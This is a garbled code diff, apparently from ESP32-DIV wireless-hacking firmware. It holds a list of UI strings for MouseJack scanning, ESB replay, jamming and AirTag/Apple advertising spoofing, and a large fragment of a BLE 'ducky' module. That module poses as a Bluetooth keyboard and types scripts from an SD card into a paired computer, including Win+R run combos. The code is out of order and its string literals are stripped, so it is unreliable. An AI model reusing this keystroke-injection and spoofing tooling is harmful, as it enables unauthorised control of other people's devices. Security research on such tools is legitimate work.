+      if (!device.isSuspicious) {
+        device.isSuspicious = true;
+        suspiciousCount++;
+        if (device.display && !device.jammingAlerted) {
+          String protocol = device.isBLE ? 
+AT-09
+AT09
+Active: 
+Active: 0 channel(s)
+Adv Type:
+Adv:
+Advertising Type Next: 
+Advertising Type Prev: 
+Advertising started.
+Advertising stopped.
+AirTag
+AirTag Alt
+Airpods
+Airpods Gen 2
+Airpods Gen 3
+Airpods Max
+Airpods Pro
+Airpods Pro Gen 2
+Amazon
+Apple
+BLE
+BT-04
+BT-05
+BT-06
+BT-08
+BT-HC05
+BT-HC06
+BT-SPP
+BT04
+BT04-A
+BT04A
+BT05
+BT06
+BT08
+BTHC05
+BTHC06
+BTSPP
+Beats Buds
+Beats BudsPlus
+Beats FitPro
+Beats Flex
+Beats Solo Pro
+Beats Solo3
+Beats Studio3
+Beats StudioPro
+BeatsX
+Bluetooth module names...
+CC41
+CC41-A
+CC41A
+Ch
+Ch 
+Ch --  --
+CiferTech
+DIRECT HIGH
+DIRECT LOW
+Device Type Next: 
+Device Type Prev: 
+Device: 
+Display interrupted by user
+ESP32-DIV
+FREE2MOVE
+FindMy
+GHz
+Galaxy Watch 4
+Galaxy Watch 5
+Galaxy Watch 6
+Google Smart Ctrl
+HC-03
+HC-04
+HC-05
+HC-06
+HC-08
+HC03
+HC04
+HC05
+HC06
+HC08
+HM-10
+HM-11
+HM-19
+HM10
+HM11
+HM19
+Hello World!
+IND
+ISM
+JDY
+JDY-*
+JDY-08
+JDY-10
+JDY-16
+JDY-23
+JDY-31
+JDY08
+JDY10
+JDY16
+JDY23
+JDY31
+LINVOR
+Listening for known skimmer
+Logitech
+MAC: 
+MLT-BT05
+MLTBT05
+MODE+
+MODE-
+Manufacturer: 
+Microsoft
+NONCONN
+NRF24
+NewAT
+Output interrupted by user
+Peak: 
+Peak: none
+Peak: scanning...
+PowerBeats
+PowerBeats Pro
+RC
+RC/Video
+RSSI: 
+SCAN
+SD
+SPP-CA
+SPPCA
+Scan interrupted by user
+Service Data: 
+Service UUID: 
+SettingsStore.h
+Strength: 
+Strength: --
+Touchscreen.h
+Tx Power: 
+USB
+Unlock iPhone, stay nearby
+Video
+WIFI
+WiFi Ch1
+WiFi Ch11
+WiFi Ch6
+ZIGBEE
+[!!] System Diagnostics
+[!] Advertising started
+[!] Advertising stopped
+[!] Calibrating noise floor...
+[!] Jammer 
+[!] No SD card
+[!] No capture selected
+[!] SD open failed
+[!] Scan refresh...
+[*] Capture paused
+[*] Captures cleared
+[*] Fixed channel
+[*] Hop enabled
+[*] Hopping Unifying channels
+[*] List cleared
+[*] No packets yet
+[*] Paused
+[*] Ready
+[*] SD logging off
+[*] Scan done  no carriers
+[*] Scan stop — 
+[*] Stopped
+[*] Tap Select or Prev/Next
+[*] Unlock iPhone, then Start
+[*] Waiting for HID traffic...
+[+] Advertising Type: 
+[+] AirTag Continuity live
+[+] Armed — capturing
+[+] Calibrate done  Ch
+[+] Device Type: 
+[+] ESB Replay ready
+[+] ESB sniffer ready
+[+] Logging to SD
+[+] Mode changed to: 
+[+] MouseJack Scan ready
+[+] Replay done
+[+] SD logging on
+[+] Scan done  
+[+] Scanner ready
+[+] Scanning
+[+] Scanning for Unifying HID
+[+] System Ready!
+[>] Play ch
+[OFF]
+[ON]
+[ble] skip init — low heap
+bgBleScan
+config.h
+freertos/FreeRTOS.h
+freertos/task.h
+from Scan / rescan
+icon.h
+logging off
+nRF
+nRF HID
+none — run Scan
+scanning for suspects.
+shared.h
+test123
+utils.h
+
+=== config.h ===
+BleCompat.h
+ELECHOUSE_CC1101_SRC_DRV.h
+arduinoFFT.h
+esp_bt.h
+esp_bt_main.h
+esp_gap_bt_api.h
+shared.h
+utils.h
+
+=== ducky.cpp ===
+'){ needShift = true; return 0x34; }
+  if (c == ',') return 0x36;  if (c == '<') { needShift = true; return 0x36; }
+  if (c == '.') return 0x37;  if (c == '>') { needShift = true; return 0x37; }
+  if (c == '/') return 0x38;  if (c == '?') { needShift = true; return 0x38; }
+  if (c == '`') return 0x35;  if (c == '~') { needShift = true; return 0x35; }
+  return 0;
+}
+
+static void typeASCII(const String& s, uint16_t charDown = 10) {
+  for (size_t i=0;i<s.length();++i){ bool shift=false; uint8_t u=keyFromChar(s[i],shift); if(u) sendKey(u, shift?MOD_SHIFT:0, charDown); }
+}
+
+static bool resolveKeyWord(const String& kw, uint8_t& usage, uint8_t& mods) {
+  String k=kw; k.toUpperCase(); usage=0; mods=0;
+  if (k==
+) + lastError, DISPLAY_WIDTH/2, duckyToastCenterY(), 2);
+            }
+          }
+          return;
+        }
+        if (pcfPressedEdge(ebLeft)) { page = Page::List; drawListPage(false); return; }
+      }
+    } else if (page == Page::Settings) {
+      if (pcfPressedEdge(ebLeft)) { page = Page::List; drawListPage(false); return; }
+    }
+  }
+Tap tap = readTap();
+  if (!tap.has) { delay(5); return; }
+
+  if (dialog == Dialog::ConfirmDelete) {
+    int id = FeatureUI::hit(confirmBtns, 2, tap.x, tap.y);
+    if (id == 0) {
+      if (!items.empty() && mountSD() && SD.exists(items[sel].path)) {
+        SD.remove(items[sel].path.c_str());
+        reloadList();
+        page = Page::List;
+        dialog = Dialog::None;
+        drawListPage(false);
+      } else {
+        dialog = Dialog::None;
+        drawDetailsPage();
+      }
+    } else if (id == 1) {
+      dialog = Dialog::None;
+      drawDetailsPage();
+    } else {
+
+    }
+    return;
+  }
+
+  handleIconTouch(tap.x, tap.y);
+
+  bool doubleTap = isDoubleTap(tap);
+
+  if (page == Page::List) {
+    bool handledFooter = false;
+    if (!featureHasTouchNavBar()) {
+      int id = FeatureUI::hit(listBtns, 3, tap.x, tap.y);
+      if (id == 0) {
+        if (!items.empty()) { page = Page::Details; drawDetailsPage(); }
+        handledFooter = true;
+      } else if (id == 1) {
+        drawListPage(true);
+        handledFooter = true;
+      } else if (id == 2) {
+        ducky_active = false;
+        feature_exit_requested = true;
+        return;
+      }
+    }
+
+    if (!handledFooter) {
+      int headerBottom, hintY, listTop, rowStride, maxVisibleItems, rw, rh;
+      bool hasScrollbar;
+      calcListLayout(headerBottom, hintY, listTop, rowStride, maxVisibleItems, hasScrollbar, rw, rh);
+
+      int y = tap.y;
+      if (y >= listTop && y < DISPLAY_HEIGHT - duckyFooterReserve()) {
+        int startItem, endItem;
+        calcListWindow(maxVisibleItems, startItem, endItem);
+        int clickedRow = (y - listTop) / rowStride;
+        int actualIdx = startItem + clickedRow;
+
+        if (actualIdx >= 0 && actualIdx < (int)items.size()) {
+          if (doubleTap && bleConnected) {
+            bool ok = execFile(items[actualIdx].path);
+            drawListPage(false);
+            if (!ok) {
+              tft.fillRoundRect(PADDING, duckyToastTop(), DISPLAY_WIDTH - 2*PADDING, 22, 6, COL_WARN);
+              uiSetTextColor(COL_BG, COL_WARN);
+              uiDrawCentreString(String(
+) + lastError, DISPLAY_WIDTH/2, duckyToastCenterY(), 2);
+            }
+          }
+          return;
+        }
+        if (pcfPressedEdge(ebLeft)) { page = Page::List; drawListPage(false); return; }
+      } else {
+        if (pcfPressedEdge(ebRight) || pcfPressedEdge(ebSelect)) {
+          if (!bleConnected) {
+            tft.fillRoundRect(PADDING, duckyToastTop(), DISPLAY_WIDTH - 2*PADDING, 22, 6, COL_WARN);
+            uiSetTextColor(COL_BG, COL_WARN);
+            uiDrawCentreString(
+) + lastError, DISPLAY_WIDTH/2, duckyToastCenterY(), 2);
+            }
+          } else {
+            updateListSelection(actualIdx);
+          }
+        }
+      }
+    }
+
+  } else if (page == Page::Details) {
+    if (!featureHasTouchNavBar()) {
+      int id = FeatureUI::hit(detailsBtns, 3, tap.x, tap.y);
+      if (id == 0) {
+        if (!bleConnected) {
+          tft.fillRoundRect(PADDING, duckyToastTop(), DISPLAY_WIDTH - 2*PADDING, 22, 6, COL_WARN);
+          uiSetTextColor(COL_BG, COL_WARN);
+          uiDrawCentreString(
+) m|=MOD_ALT;
+    else if(t==
+) m|=MOD_CTRL;
+    else if(t==
+) m|=MOD_GUI;
+    else break;
+    ++i;
+  }
+  return m;
+}
+static uint32_t clampDelay(int v){ if(v<0)v=0; if(v>600000)v=600000; return (uint32_t)v; }
+static void pressCombo(uint8_t usage, uint8_t mods, uint16_t downMs=50){
+  if(!bleConnected) return;
+  KbdReport idle{}; inputChr->setValue((uint8_t*)&idle,sizeof(idle)); inputChr->notify(); delay(3);
+  KbdReport rpt{}; rpt.modifiers=mods; rpt.keys[0]=usage;
+  inputChr->setValue((uint8_t*)&rpt,sizeof(rpt)); inputChr->notify(); delay(downMs);
+  inputChr->setValue((uint8_t*)&idle,sizeof(idle)); inputChr->notify(); delay(5);
+}
+static bool execLine(const String& raw, uint32_t& interDelay, String& err){
+  String line=raw; line.trim(); if(!line.length()) return true;
+  if(line.startsWith(
+) m|=MOD_SHIFT;
+    else if(t==
+) usage=KEY_BACKSPACE;
+  else if (k==
+) usage=KEY_DOWN;
+  else if (k==
+) usage=KEY_END;
+  else if (k==
+) usage=KEY_ENTER;
+  else if (k==
+) usage=KEY_ESC;
+  else if (k==
+) usage=KEY_HOME;
+  else if (k==
+) usage=KEY_LEFT;
+  else if (k==
+) usage=KEY_PAGEDOWN;
+  else if (k.startsWith(
+) usage=KEY_PAGEUP;
+  else if (k==
+) usage=KEY_RIGHT;
+  else if (k==
+) usage=KEY_SPACE;
+  else if (k==
+) usage=KEY_TAB;
+  else if (k==
+) usage=KEY_UP;
+  else if (k==
+)) return true;
+
+  std::vector<String> tok; { String tmp; for(size_t i=0;i<line.length();++i){ char c=line[i]; if(c==' '||c=='\t'){ if(tmp.length()){tok.push_back(tmp); tmp=
+)) { int n=k.substring(1).toInt(); if(n>=1&&n<=12) usage = KEY_F1+(n-1); }
+  if (usage) return true;
+  if (k.length()==1){ char c=k[0]; bool sh=false; uint8_t u=keyFromChar(c,sh); if(u){usage=u; mods=sh?MOD_SHIFT:0; return true;} }
+  return false;
+}
+static uint8_t modsFromTokens(const std::vector<String>& toks, size_t& i) {
+  uint8_t m=0;
+  while(i<toks.size()){
+    String t=toks[i]; t.toUpperCase();
+    if(t==
+)+cmd; return false;
+}
+
+static bool execFile(const String& path) {
+  lastError = 
+)+rest; return false; } }
+    if(!usage) usage=KEY_R; pressCombo(usage, MOD_GUI); if(defaultDelay) delay(defaultDelay); return true;
+  }
+  if(ucmd==
+)+tokens[i]; return false; }
+    pressCombo(usage,mods); if(defaultDelay) delay(defaultDelay); return true;
+  }
+  if(ucmd==
+)+ucmd; return false; }
+    pressCombo(usage,m); if(defaultDelay) delay(defaultDelay); return true;
+  }
+  if(ucmd==
+);
+
+  listUiValid = false;
+
+  if (!sd_mounted) {
+    listLoadedOnce = false;
+    uiSetTextColor(COL_FG, COL_BG);
+    uiDrawCentreString(
+);
+
+  uiSetTextColor(COL_FG, COL_BG);
+  const int barY = TOOLBAR_Y;
+  const int baseY = barY + TEXT_HEADER_H + 1;
+
+  tft.fillRect(0, baseY, DISPLAY_WIDTH, DISPLAY_HEIGHT - baseY - duckyFooterReserve(), COL_BG);
+
+  const int rowGap = 24;
+  int y = baseY + 8;
+
+  uiSetTextFont(2);
+  uiSetTextColor(UI_TEXT, COL_BG);
+  uiDrawString(
+);
+
+  uiSetTextColor(COL_FG, COL_BG);
+  const int barY = TOOLBAR_Y;
+  const int baseY = barY + TEXT_HEADER_H + 1;
+
+  tft.fillRect(0, baseY, DISPLAY_WIDTH, DISPLAY_HEIGHT - baseY - duckyFooterReserve(), COL_BG);
+
+  if (items.empty()) {
+    uiDrawCentreString(
+);
+      lastCardPresent = cardPresent;
+      return;
+    }
+    lastCardPresent = cardPresent;
+    if (!cardPresent) {
+      sd_mounted = false;
+    } else if (cardPresent && !sd_mounted) {
+
+      mountSD();
+    }
+  }
+
+  if (force || lastHeaderBle != bleConnected || lastHeaderSd != sd_mounted) {
+    uiDrawn = false;
+    drawIconHeader();
+
+    drawHeader(HeaderType::TextWithInfo, 
+);
+  hid->pnp(0x02, 0xE502, 0xA111, 0x0210);
+  hid->hidInfo(0x00, 0x02);
+  hid->reportMap((uint8_t*)REPORT_MAP, sizeof(REPORT_MAP));
+  hid->startServices();
+  hid->setBatteryLevel(100);
+
+  auto* sec = new NimBLESecurity();
+  sec->setAuthenticationMode(ESP_LE_AUTH_REQ_SC_BOND);
+  sec->setCapability(BLE_HS_IO_NO_INPUT_OUTPUT);
+
+  NimBLEAdvertisementData advData;
+  advData.setFlags(0x06);
+  advData.setAppearance(0x03C1);
+
+  advData.setName(devName);
+
+  std::string msd; msd.push_back(0x06); msd.push_back(0x00); msd.push_back(0x00); msd.push_back(0x00); msd.push_back((char)0x80);
+  advData.setManufacturerData(msd);
+
+  NimBLEAdvertisementData scanRsp; scanRsp.setName(devName);
+
+  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
+  if (adv) adv->stop();
+  adv->setAdvertisementData(advData);
+  adv->setScanResponseData(scanRsp);
+  adv->setAdvertisementType(BLE_GAP_CONN_MODE_UND);
+  adv->setMinInterval(0x00A0);
+  adv->setMaxInterval(0x0140);
+  adv->start();
+}
+
+void enter() {
+
+#ifdef SD_CD
+  pinMode(SD_CD, INPUT_PULLUP);
+  if (digitalRead(SD_CD)) {
+
+    tft.fillRect(0, TOOLBAR_Y - 1, DISPLAY_WIDTH, DISPLAY_HEIGHT - (TOOLBAR_Y - 1), COL_BG);
+    uiSetTextColor(UI_WARN, COL_BG);
+    uiSetTextFont(2);
+    uiDrawCentreString(
+){
+    int n=(int)rest.toInt(); if(n<0)n=0; while(n--){ sendKey(KEY_ENTER); if(defaultDelay) delay(defaultDelay); }
+    return true;
+  }
+  err=String(
+){
+    size_t i=0; std::vector<String> tokens; { String s=line; String t; for(size_t j=0;j<s.length();++j){ char ch=s[j]; if(ch==' '||ch=='\t'){ if(t.length()){tokens.push_back(t); t=
+){
+    uint8_t usage=0; if(rest.length()){ uint8_t m=0; if(!resolveKeyWord(rest,usage,m)){ err=String(
+){ defaultDelay=clampDelay(rest.toInt()); return true; }
+  if(ucmd==
+){ delay(clampDelay(rest.toInt())); return true; }
+  if(ucmd==
+){ interDelay=clampDelay(rest.toInt()); delay(interDelay); return true; }
+  if(ucmd==
+){ sendKey(KEY_ENTER); if(defaultDelay) delay(defaultDelay); return true; }
+
+  if(ucmd==
+){ typeASCII(rest); if(defaultDelay) delay(defaultDelay); return true; }
+  if(ucmd==
+,    FeatureUI::ButtonStyle::Primary,
+      
+,    FeatureUI::ButtonStyle::Secondary
+    );
+    for (auto& b: detailsBtns) FeatureUI::drawButton(b);
+  }
+}
+
+static void drawSettingsPage() {
+
+  drawHeader(HeaderType::IconBar);
+  drawHeader(HeaderType::TextWithInfo, 
+,    FeatureUI::ButtonStyle::Secondary
+    );
+    for (auto& b: listBtns) FeatureUI::drawButton(b);
+  }
+}
+
+static void drawDetailsPage() {
+
+  drawHeader(HeaderType::IconBar);
+  drawHeader(HeaderType::TextWithInfo, 
+,  FeatureUI::ButtonStyle::Danger,
+      
+,  FeatureUI::ButtonStyle::Secondary, false };
+
+  FeatureUI::drawButton(confirmBtns[0]);
+  FeatureUI::drawButton(confirmBtns[1]);
+}
+
+static void startBleKeyboard(const char* devName) {
+
+  NimBLEDevice::setPower(ESP_PWR_LVL_P9);
+
+  NimBLEServer* server = NimBLEDevice::createServer();
+  server->setCallbacks(new ServerCB());
+
+  hid = new NimBLEHIDDevice(server);
+  inputChr  = hid->inputReport(1);
+  outputChr = hid->outputReport(1);
+  outputChr->setCallbacks(new OutputCB());
+
+  static const uint8_t REPORT_MAP[] = {
+    0x05,0x01, 0x09,0x06, 0xA1,0x01,
+    0x85,0x01, 0x05,0x07, 0x19,0xE0, 0x29,0xE7,
+    0x15,0x00, 0x25,0x01, 0x75,0x01, 0x95,0x08, 0x81,0x02,
+    0x75,0x08, 0x95,0x01, 0x81,0x01,
+    0x75,0x08, 0x95,0x06, 0x15,0x00, 0x25,0x65, 0x05,0x07, 0x19,0x00, 0x29,0x65, 0x81,0x00,
+    0x05,0x08, 0x19,0x01, 0x29,0x05, 0x95,0x05, 0x75,0x01, 0x91,0x02,
+    0x95,0x01, 0x75,0x03, 0x91,0x01,
+    0xC0
+  };
+
+  hid->manufacturer()->setValue(
+, (unsigned long)kb);
+    uiSetTextFont(1);
+    int sx = rx + rw - uiTextWidth(sbuf, 1) - 8;
+    uiSetTextColor(selected ? UI_OK : UI_TEXT, body);
+    uiDrawString(sbuf, sx, y + 8, 1);
+
+    uiSetTextFont(1);
+    String desc = items[i].desc.length() ? items[i].desc : 
+, (unsigned long)kb);
+  uiSetTextFont(1);
+  int sx = rx + rw - uiTextWidth(sbuf, 1) - 8;
+  uiSetTextColor(selected ? UI_OK : UI_TEXT, body);
+  uiDrawString(sbuf, sx, y + 8, 1);
+
+  uiSetTextFont(1);
+  String desc = items[i].desc.length() ? items[i].desc : 
+, 140, y, 2);
+    y += 28;
+
+    uiDrawString(
+, 150, y, 2);
+  uiSetTextColor(COL_FG, COL_BG);
+  y += rowGap;
+
+  uiDrawString(
+, 190, y, 2);
+  y += rowGap;
+
+  uiDrawString(
+, DISPLAY_WIDTH/2, DISPLAY_HEIGHT - 36, 2);
+
+  ui_busy = false;
+  delay(500);
+  return true;
+}
+
+static FeatureUI::Button listBtns[3];
+static FeatureUI::Button detailsBtns[3];
+static FeatureUI::Button confirmBtns[2];
+static FeatureUI::Button infoBtn;
+
+enum class HeaderType { TextOnly, IconBar, TextWithInfo };
+
+static void drawHeader(HeaderType type, const String& title = 
+, DISPLAY_WIDTH/2, DISPLAY_HEIGHT/2 + 10, 1);
+    delay(900);
+    ducky_active = false;
+    feature_exit_requested = true;
+    return;
+  }
+  needsRedraw = true;
+}
+
+bool active() { return ducky_active; }
+
+void exit() {
+
+  ducky_active = false;
+  setTouchButtonInputEnabled(false);
+  setTouchNavLabels(nullptr, nullptr, nullptr, nullptr, nullptr);
+  ui_busy = false;
+  dialog = Dialog::None;
+  uiDrawn = false;
+
+  if (hid && inputChr && bleConnected) {
+    KbdReport idle{};
+    inputChr->setValue((uint8_t*)&idle, sizeof(idle));
+    inputChr->notify();
+  }
+
+  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
+  if (adv) {
+    adv->stop();
+
+    NimBLEAdvertisementData empty;
+    adv->setAdvertisementData(empty);
+    adv->setScanResponseData(empty);
+  }
+}
+void setup() {
+  ducky_active = false;
+  uiSetTextDatum(TL_DATUM);
+  mountSD(); ensureDuckyDir();
+
+  ui_inited = false; needsRedraw = true; ui_busy = false; dialog = Dialog::None; uiDrawn = false;
+}
+
+void loop() {
+
+  if (!ui_inited) {
+
+    tft.fillRect(0, TOOLBAR_Y - 1, DISPLAY_WIDTH,
+                 DISPLAY_HEIGHT - (TOOLBAR_Y - 1) - duckyFooterReserve(), COL_BG);
+    sel = 0;
+    page = Page::List;
+    uiDrawn = false;
+    drawListPage();
+    ui_inited = true;
+    needsRedraw = false;
+    refreshHeaderStatusIfNeeded(true);
+  }
+
+  updateIconAnimation();
+
+  refreshHeaderStatusIfNeeded(false);
+  if (feature_exit_requested) return;
+
+  if (ui_busy) { delay(5); return; }
+
+  if (dialog != Dialog::ConfirmDelete) {
+    if (page == Page::List) {
+      if (featureHasTouchNavBar()) {
+        if (pcfPressedEdge(ebUp))   { if (sel > 0) { updateListSelection(sel - 1); } return; }
+        if (pcfPressedEdge(ebDown)) { drawListPage(true); return; }
+        if (pcfPressedEdge(ebRight)) {
+          if (sel < (int)items.size() - 1) { updateListSelection(sel + 1); }
+          return;
+        }
+        if (pcfPressedEdge(ebSelect)) {
+          if (!items.empty()) { page = Page::Details; drawDetailsPage(); }
+          return;
+        }
+        if (pcfPressedEdge(ebLeft)) {
+          ducky_active = false;
+          feature_exit_requested = true;
+          return;
+        }
+      } else {
+        if (pcfPressedEdge(ebUp))   { if (sel>0){ updateListSelection(sel - 1); } else {  } return; }
+        if (pcfPressedEdge(ebDown)) { if (sel < (int)items.size()-1){ updateListSelection(sel + 1); } return; }
+        if (pcfPressedEdge(ebRight) || pcfPressedEdge(ebSelect)) { if (!items.empty()) { page = Page::Details; drawDetailsPage(); } return; }
+        if (pcfPressedEdge(ebLeft)) {
+          ducky_active = false;
+          feature_exit_requested = true;
+          return;
+        }
+      }
+    } else if (page == Page::Details) {
+      if (featureHasTouchNavBar()) {
+        if (pcfPressedEdge(ebUp)) { page = Page::List; drawListPage(false); return; }
+        if (pcfPressedEdge(ebDown)) {
+          dialog = Dialog::ConfirmDelete;
+          drawConfirmDelete();
+          return;
+        }
+        if (pcfPressedEdge(ebRight) || pcfPressedEdge(ebSelect)) {
+          if (!bleConnected) {
+            tft.fillRoundRect(PADDING, duckyToastTop(), DISPLAY_WIDTH - 2*PADDING, 22, 6, COL_WARN);
+            uiSetTextColor(COL_BG, COL_WARN);
+            uiDrawCentreString(
+, DISPLAY_WIDTH/2, DISPLAY_HEIGHT/2 + 10, 1);
+    delay(900);
+    ducky_active = false;
+    feature_exit_requested = true;
+    return;
+  }
+#endif
+
+  ducky_active = true;
+  setTouchButtonInputEnabled(true);
+  ui_busy = false;
+  dialog = Dialog::None;
+  ui_inited = false;
+
+  if (!hid) startBleKeyboard(DEV_NAME);
+  else {
+    NimBLEAdvertisementData advData;
+    advData.setFlags(0x06);
+    advData.setAppearance(0x03C1);
+    advData.setName(DEV_NAME);
+    std::string msd; msd.push_back(0x06); msd.push_back(0x00); msd.push_back(0x00); msd.push_back(0x00); msd.push_back((char)0x80);
+    advData.setManufacturerData(msd);
+    NimBLEAdvertisementData scanRsp; scanRsp.setName(DEV_NAME);
+
+    NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
+    if (adv) {
+      adv->stop();
+      adv->setAdvertisementData(advData);
+      adv->setScanResponseData(scanRsp);
+      adv->setAdvertisementType(BLE_GAP_CONN_MODE_UND);
+      adv->setMinInterval(0x00A0);
+      adv->setMaxInterval(0x0140);
+      adv->start();
+    }
+  }
+
+  if (hid && inputChr && bleConnected) {
+    KbdReport idle{}; inputChr->setValue((uint8_t*)&idle, sizeof(idle)); inputChr->notify();
+  }
+
+  if (!mountSD() || !ensureDuckyDir()) {
+    tft.fillRect(0, TOOLBAR_Y - 1, DISPLAY_WIDTH,
+                 DISPLAY_HEIGHT - (TOOLBAR_Y - 1) - duckyFooterReserve(), COL_BG);
+    uiSetTextColor(UI_WARN, COL_BG);
+    uiSetTextFont(2);
+    uiDrawCentreString(
+, DISPLAY_WIDTH/2, DISPLAY_HEIGHT/2 - 14, 2);
+    uiSetTextFont(1);
+    uiSetTextColor(UI_TEXT, COL_BG);
+    uiDrawCentreString(
+, DISPLAY_WIDTH/2, DISPLAY_HEIGHT/2 - 8, 2);
+  } else {
+    if (forceReload || !listLoadedOnce) {
+      reloadList();
+      listLoadedOnce = true;
+    }
+    clampSel();
+    drawListContentFull();
+  }
+  if (featureHasTouchNavBar()) {
+    duckyUpdateNavLabels();
+  } else {
+    FeatureUI::layoutFooter3(
+      listBtns,
+      
+, DISPLAY_WIDTH/2, baseY+24, 2);
+    uiSetTextFont(1);
+    uiSetTextColor(UI_TEXT, COL_BG);
+    uiDrawCentreString(
+, DISPLAY_WIDTH/2, baseY+48, 1);
+  }
+  else {
+    auto& it = items[sel];
+    int y = baseY + 8;
+
+    uiSetTextFont(2);
+
+    uiSetTextColor(UI_TEXT, COL_BG);
+    String displayName = fitText(it.name, DISPLAY_WIDTH - 2*PADDING, 2);
+    uiDrawString(displayName, PADDING, y, 2);
+    y += 24;
+
+    tft.drawLine(PADDING, y, DISPLAY_WIDTH - PADDING, y, UI_LINE);
+    y += 8;
+
+    uiSetTextFont(2);
+    uiSetTextColor(COL_FG, COL_BG);
+
+    uiDrawString(
+, DISPLAY_WIDTH/2, duckyToastCenterY(), 2);
+          } else if (!items.empty()) {
+            bool ok = execFile(items[sel].path);
+            drawDetailsPage();
+            if (!ok) {
+              tft.fillRoundRect(PADDING, duckyToastTop(), DISPLAY_WIDTH - 2*PADDING, 22, 6, COL_WARN);
+              uiSetTextColor(COL_BG, COL_WARN);
+              uiDrawCentreString(String(
+, DISPLAY_WIDTH/2, duckyToastCenterY(), 2);
+        } else if (!items.empty()) {
+          bool ok = execFile(items[sel].path);
+          drawDetailsPage();
+          if (!ok) {
+            tft.fillRoundRect(PADDING, duckyToastTop(), DISPLAY_WIDTH - 2*PADDING, 22, 6, COL_WARN);
+            uiSetTextColor(COL_BG, COL_WARN);
+            uiDrawCentreString(String(
+, DISPLAY_WIDTH/2, execTop + 4, 2);
+  uiDrawString(
+, DISPLAY_WIDTH/2, y + 10, 2);
+  uiSetTextColor(UI_TEXT, UI_FG);
+  uiDrawCentreString(
+, DISPLAY_WIDTH/2, y + 30, 2);
+
+  int bw = (w - 3*PADDING)/2;
+  int bx1 = x + PADDING;
+  int bx2 = x + 2*PADDING + bw;
+  int by  = y + h - PADDING - BTN_H;
+
+  confirmBtns[0] = { (int16_t)bx1, (int16_t)by, (int16_t)bw, (int16_t)BTN_H, 
+, FeatureUI::ButtonStyle::Danger, false };
+  confirmBtns[1] = { (int16_t)bx2, (int16_t)by, (int16_t)bw, (int16_t)BTN_H, 
+, FeatureUI::ButtonStyle::Primary,
+      
+, FeatureUI::ButtonStyle::Secondary);
+    FeatureUI::drawButton(infoBtn);
+  }
+}
+
+static void drawConfirmDelete() {
+
+  const int w = DISPLAY_WIDTH - 2*PADDING;
+  const int h = 96;
+  const int x = PADDING;
+  const int y = DISPLAY_HEIGHT/2 - h/2;
+
+  tft.fillRoundRect(x, y, w, h, 8, UI_FG);
+  tft.drawRoundRect(x, y, w, h, 8, UI_LINE);
+  uiSetTextColor(UI_TEXT, UI_FG);
+  uiDrawCentreString(
+, FeatureUI::ButtonStyle::Secondary,
+      
+, PADDING, execTop + 24, 2);
+  uiDrawString(path, 48, execTop + 24, 2);
+
+  if (bleConnected) { KbdReport idle{}; inputChr->setValue((uint8_t*)&idle,sizeof(idle)); inputChr->notify(); delay(10); }
+
+  int y = execTop + 44;
+  const int yMax = DISPLAY_HEIGHT - 6;
+
+  ui_busy = true;
+
+  while (f.available()) {
+    String line = trimCR(f.readStringUntil('\n'));
+    String err;
+    if (!execLine(line, interDelay, err)) {
+      lastError = err; f.close();
+      if (bleConnected) { KbdReport idle{}; inputChr->setValue((uint8_t*)&idle,sizeof(idle)); inputChr->notify(); delay(10); }
+      ui_busy = false;
+      return false;
+    }
+    if (defaultDelay) delay(defaultDelay);
+
+    if (y < yMax) {
+      String disp = fitText(line, DISPLAY_WIDTH - 2*PADDING, 2);
+      uiDrawString(disp, PADDING, y, 2); y += 18;
+    }
+    yield();
+  }
+  f.close();
+
+  if (bleConnected) { KbdReport idle{}; inputChr->setValue((uint8_t*)&idle,sizeof(idle)); inputChr->notify(); delay(20); }
+
+  tft.fillRoundRect(PADDING, DISPLAY_HEIGHT - 40, DISPLAY_WIDTH - 2*PADDING, 28, 6, COL_ACCENT);
+  uiSetTextColor(COL_BG, COL_ACCENT);
+  uiDrawCentreString(
+, PADDING, hintY, 1);
+}
+
+static void drawListScrollbar(int listTop, int rowStride, int maxVisibleItems, int startItem) {
+  if ((int)items.size() <= maxVisibleItems) return;
+  int scrollBarX = DISPLAY_WIDTH - 8;
+  const int viewportH = maxVisibleItems * rowStride - LIST_ROW_GAP;
+  int scrollBarHeight = viewportH - 8;
+  int scrollBarY = listTop + 4;
+  int indicatorHeight = (maxVisibleItems * scrollBarHeight) / (int)items.size();
+  int indicatorY = scrollBarY + (startItem * (scrollBarHeight - indicatorHeight)) / (int)items.size();
+
+  tft.fillRect(scrollBarX, scrollBarY, 4, scrollBarHeight, UI_LINE);
+  tft.fillRect(scrollBarX, indicatorY, 4, indicatorHeight, COL_ACCENT);
+}
+
+static void drawListRow(int i, int startItem, int listTop, int rowStride,
+                        int rx, int rw, int rh) {
+  const int maxVisibleItems = lastListMaxVisible;
+  const int endItem = min((int)items.size(), startItem + maxVisibleItems);
+  if (i < startItem || i >= endItem) return;
+
+  int y = listTop + (i - startItem) * rowStride;
+  bool selected = (i == sel);
+  uint16_t body = selected ? COL_ROWSEL : COL_BG;
+  uint16_t border = selected ? COL_ACCENT : UI_LINE;
+
+  int wedgeX = rx - 8; if (wedgeX < 0) wedgeX = 0;
+  tft.fillRect(wedgeX, y, rx - wedgeX, rh, COL_BG);
+
+  tft.fillRoundRect(rx, y, rw, rh, 6, body);
+  tft.drawRoundRect(rx, y, rw, rh, 6, border);
+
+  if (selected) {
+    tft.fillTriangle(rx - 6, y + rh/2 - 4, rx - 6, y + rh/2 + 4, rx - 2, y + rh/2, COL_ACCENT);
+  }
+
+  uiSetTextColor(COL_FG, body);
+  uiSetTextFont(2);
+  String name = fitText(items[i].name, rw - 40, 2);
+  uiDrawString(name, rx + 12, y + 6, 2);
+
+  uint32_t kb = (items[i].size + 1023) / 1024;
+  char sbuf[16];
+  snprintf(sbuf, sizeof(sbuf), 
+, PADDING, y, 1);
+
+  if (featureHasTouchNavBar()) {
+    duckyUpdateNavLabels();
+  } else {
+    FeatureUI::layoutFooter1(infoBtn, 
+, PADDING, y, 1);
+  y += 14;
+  uiDrawString(
+, PADDING, y, 2);
+    tft.drawNumber(it.size, 100, y, 2);
+    uiDrawString(
+, PADDING, y, 2);
+    uiSetTextFont(1);
+    String path = fitText(it.path, DISPLAY_WIDTH - 100 - PADDING, 1);
+    uiDrawString(path, 100, y + 2, 1);
+    y += 28;
+
+    uiSetTextFont(2);
+    uiDrawString(
+, PADDING, y, 2);
+    y += 24;
+
+    uiSetTextFont(1);
+    String desc = it.desc.length() ? it.desc : 
+, PADDING, y, 2);
+  tft.drawNumber((int)items.size(), 150, y, 2);
+  y += rowGap;
+
+  uiDrawString(
+, PADDING, y, 2);
